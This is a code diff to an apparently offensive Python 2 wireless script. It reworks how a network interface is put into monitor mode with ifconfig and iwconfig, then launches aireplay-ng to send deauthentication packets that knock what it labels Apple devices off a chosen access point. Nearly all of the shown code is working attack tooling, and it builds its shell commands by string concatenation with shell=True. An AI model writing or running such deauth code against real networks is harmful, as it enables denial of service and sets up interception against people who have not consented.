@@ -80,18 +80,28 @@ if __name__ == "__main__":
     print Base.c_info + "Channel interface " + listen_network_interface + ": " + Base.cINFO + channel + Base.cEND
     print Base.c_info + "Frequency interface " + listen_network_interface + ": " + Base.cINFO + freq + Base.cEND
 
-    print Base.c_info + "Monitor mode for interface:  " + aireplay_network_interface + " channel: " + channel
-    print Base.c_info + 'Command: airmon-ng start ' + aireplay_network_interface + ' ' + channel
+    print Base.c_info + "Monitor mode for interface: " + aireplay_network_interface + " channel: " + channel + " ..."
     try:
-        sub.Popen(['airmon-ng stop ' + aireplay_network_interface], shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
-        sub.Popen(['airmon-ng start ' + aireplay_network_interface + ' ' + channel],
-                  shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
+        sub.Popen(['ifconfig ' + aireplay_network_interface + ' down'], shell=True, stdout=sub.PIPE)
+        sleep(0.5)
+        sub.Popen(['iwconfig ' + aireplay_network_interface + ' mode managed'], shell=True, stdout=sub.PIPE)
+        sleep(0.5)
+        sub.Popen(['ifconfig ' + aireplay_network_interface + ' up'], shell=True, stdout=sub.PIPE)
+        sleep(0.5)
+        sub.Popen(['iwconfig ' + aireplay_network_interface + ' channel ' + channel], shell=True, stdout=sub.PIPE)
+        sleep(0.5)
+        sub.Popen(['ifconfig ' + aireplay_network_interface + ' down'], shell=True, stdout=sub.PIPE)
+        sleep(0.5)
+        sub.Popen(['iwconfig ' + aireplay_network_interface + ' mode monitor'], shell=True, stdout=sub.PIPE)
+        sleep(0.5)
+        sub.Popen(['ifconfig ' + aireplay_network_interface + ' up'], shell=True, stdout=sub.PIPE)
+        sleep(0.5)
     except OSError as e:
         if e.errno == errno.ENOENT:
-            print Base.c_error + "Program: airmon-ng is not installed!"
+            print Base.c_error + "Program: iwconfig or ifconfig is not installed!"
             exit(1)
         else:
-            print Base.c_error + "Something else went wrong while trying to run `airmon-ng`"
+            print Base.c_error + "Something else went wrong while trying to run `iwconfig` or `ifconfig`"
             exit(2)
 
     script_dir = path.dirname(path.realpath(__file__))
@@ -133,12 +143,12 @@ if __name__ == "__main__":
                         exit(2)
 
                 print Base.c_info + "Send " + number_of_deauth + " deauth packets to: " + apple_device[1]
-                print Base.c_info + 'Command: aireplay-ng ' + aireplay_network_interface + 'mon -0 ' + \
-                      number_of_deauth + ' -a ' + bssid + ' -c ' + apple_device[1]
+                print Base.c_info + 'Command: aireplay-ng ' + aireplay_network_interface + ' -0 ' + \
+                      number_of_deauth + ' -a ' + bssid + ' -c ' + apple_device[1] + ' &'
                 try:
                     aireplay_err = ""
-                    aireplay = sub.Popen(['aireplay-ng ' + aireplay_network_interface + 'mon -0 ' + number_of_deauth +
-                                         ' -a ' + bssid + ' -c ' + apple_device[1]],
+                    aireplay = sub.Popen(['aireplay-ng ' + aireplay_network_interface + ' -0 ' + number_of_deauth +
+                                         ' -a ' + bssid + ' -c ' + apple_device[1] + ' &'],
                                          shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
                     aireplay_out, aireplay_err = aireplay.communicate()
                     
